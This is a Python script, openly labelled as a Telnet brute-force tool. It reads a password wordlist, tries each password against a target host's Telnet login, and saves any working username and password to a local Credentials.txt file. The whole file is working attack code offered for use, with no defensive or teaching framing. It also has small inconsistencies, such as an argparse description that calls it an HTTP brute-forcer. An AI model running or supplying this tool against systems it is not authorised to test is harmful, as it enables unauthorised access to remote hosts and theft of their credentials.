# Python Script for Telnet Brute Force

# Importing Module
import telnetlib, socket, argparse
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RESET = Fore.RESET

def telnetbrute(hostname, username, password):
    # Initializing Telnet Client
    client = telnetlib.Telnet(hostname)

    try:
        client.read_until(b"login: ")
    except EOFError:
        print("Error: Read(login) failed")

    try:
        client.write(username.encode('ascii') + b"\n")
    except socket.error:
        print("Error: Write(username) failed")

    if password:
        try:
            client.read_until(b"Password: ")
        except EOFError:
            print("Error: Read(password) failed")

        try:
            client.write(password.encode('ascii') + b"\n")
        except socket.error:
            print("Error: Write(password) failed")

        print(f"Attempting password: {password}")

        try:
            (i, obj, byt) = client.expect([b'incorrect', b'@'], 2)
        except EOFError:
            print("Error occurred")

        if i == 1:
            print(f"{GREEN}[+] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
            return True
        else:
            print(f"[!] Invalid credentials for {username}:{password}")

        client.close()
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Bruteforce Python Script")
    parser.add_argument("host", help="Hostname or IP Address of Server to brute force")
    parser.add_argument("-P", "--passlist", help="Password list text file")
    parser.add_argument("-u", "--user", help="Host username")

    # Parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user

    # Read the file
    passlist = open(passlist).read().splitlines()

    # Start the brute force
    for password in passlist:
        if telnetbrute(host, user, password):
            # Save valid combination to a file
            open("Credentials.txt", "w").write(f"{user}@{host}:{password}")
            break